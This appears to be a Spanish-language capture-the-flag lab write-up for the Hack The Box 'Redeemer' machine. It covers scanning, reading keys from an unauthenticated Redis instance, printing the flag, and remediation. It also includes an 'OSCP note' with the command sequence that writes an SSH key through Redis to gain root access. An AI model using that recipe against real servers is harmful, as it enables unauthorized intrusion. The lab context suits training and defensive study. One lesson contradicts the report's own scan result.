# HTB Machine Report — Redeemer

**Date:** 2026-05-25
**Author:** Franksimon
**Platform:** Hack The Box — Starting Point
**Difficulty:** Very Easy
**OS:** Linux
**IP:** 10.129.18.180
**Status:** Pwned

---

## 1. Executive Summary

Redeemer es una máquina Linux que expone un servicio Redis 5.0.7 en el puerto 6379 sin autenticación. El acceso directo con `redis-cli` permite enumerar todas las keys almacenadas en memoria y leer su contenido, incluyendo el flag.

---

## 2. Enumeration

### 2.1 Port Scan

```bash
nmap -sC -sV -O 10.129.18.180
```

| Port     | State | Service | Version              |
|----------|-------|---------|----------------------|
| 6379/tcp | open  | redis   | Redis key-value store 5.0.7 |

- OS: Linux 4.15 - 5.19
- Redis corriendo como standalone, sin autenticación

### 2.2 Redis Enumeration

```bash
redis-cli -h 10.129.18.180
```

Comando `info` reveló:
- Redis 5.0.7, modo standalone
- `role:master`, sin slaves
- Base de datos activa: `db0` con 4 keys

```bash
keys *
```

| Key  | Tipo |
|------|------|
| flag | string |
| temp | string |
| numb | string |
| stor | string |

---

## 3. Vulnerability Identification

| # | Vulnerability | CVE | CVSS | Location |
|---|--------------|-----|------|----------|
| 1 | Redis sin autenticación | — | 9.8 | Puerto 6379 |
| 2 | Redis expuesto a red externa | — | 7.5 | Puerto 6379 |

**Por qué es explotable:**
Redis por defecto no requiere contraseña (`requirepass` deshabilitado). Al estar expuesto en red, cualquier atacante puede conectarse con `redis-cli` y leer, modificar o eliminar toda la data en memoria. En escenarios avanzados, Redis sin auth también permite escritura de archivos arbitrarios (webshell, SSH keys).

---

## 4. Exploitation

### 4.1 Acceso y lectura del flag

```bash
redis-cli -h 10.129.18.180
keys *
get flag
```

**Resultado:** Lectura directa del valor de la key `flag` sin credenciales.

---

## 5. Post-Exploitation

### 5.1 Flag

```bash
get flag
```

**Flag:** `03e1d2b376c37ab3f5319922053953eb`

---

## 6. Remediation

| Finding | Recommendation | Priority |
|---------|---------------|----------|
| Redis sin autenticación | Configurar `requirepass` en `/etc/redis/redis.conf` | Critical |
| Redis expuesto externamente | Bindear solo a localhost: `bind 127.0.0.1` | Critical |
| Sin cifrado en tránsito | Configurar TLS o tunelizar por SSH | High |

---

## 7. Lessons Learned

- Redis expuesto sin auth es crítico — acceso inmediato a toda la data en memoria.
- `keys *` lista todas las keys de la base de datos activa.
- En escenarios reales, Redis sin auth puede usarse para RCE escribiendo SSH keys o cron jobs con `CONFIG SET dir` + `CONFIG SET dbfilename`.
- Siempre escanear puertos altos (`-p-`) — Redis en 6379 no sale en el scan de 1000 puertos por defecto de nmap.

> **OSCP note:** Redis sin auth → intentar `CONFIG SET dir /root/.ssh` + `CONFIG SET dbfilename authorized_keys` + `SET pwn "ssh-rsa <tu_key>"` + `BGSAVE`. Esto escribe tu llave pública y permite SSH como root.

---

## 8. References

- HTB Starting Point — Redeemer
- Redis Security: https://redis.io/docs/management/security/
- HackTricks — Redis RCE via SSH keys
